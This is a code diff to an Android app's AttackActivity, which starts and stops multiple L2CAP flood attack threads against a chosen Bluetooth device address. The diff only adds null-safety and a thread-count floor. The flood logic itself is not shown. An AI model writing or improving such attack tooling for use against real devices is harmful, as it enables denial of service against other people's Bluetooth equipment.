@@ -113,12 +113,14 @@ class AttackActivity : AppCompatActivity() {
     private fun startAttack() {
         isAttacking = true
         buttonStartStop.text = "Stop"
-        BluetoothAdapter.getDefaultAdapter().cancelDiscovery()
-        Logger.appendLog(logAttack, "Attack Started! Address: $address ($deviceName) | Threads: $threads")
+        BluetoothAdapter.getDefaultAdapter()?.cancelDiscovery()
+
+        val workerCount = threads.coerceAtLeast(1)
+        Logger.appendLog(logAttack, "Attack Started! Address: $address ($deviceName) | Threads: $workerCount")
         Toast.makeText(this@AttackActivity, "Attack started. Tap Stop to end it.", Toast.LENGTH_SHORT).show()
 
         attackers.clear()
-        for (i in 1..threads) {
+        for (i in 1..workerCount) {
             val attacker = L2capFloodAttack(address)
             attackers.add(attacker)
             attacker.startAttack(this, logAttack)
@@ -136,7 +138,7 @@ class AttackActivity : AppCompatActivity() {
         attackers.clear()
 
         Logger.appendLog(logAttack, "Attack stopped.")
-        BluetoothAdapter.getDefaultAdapter().startDiscovery()
+        BluetoothAdapter.getDefaultAdapter()?.startDiscovery()
         Toast.makeText(this@AttackActivity, "Attack stopped.", Toast.LENGTH_SHORT).show()
     }
 
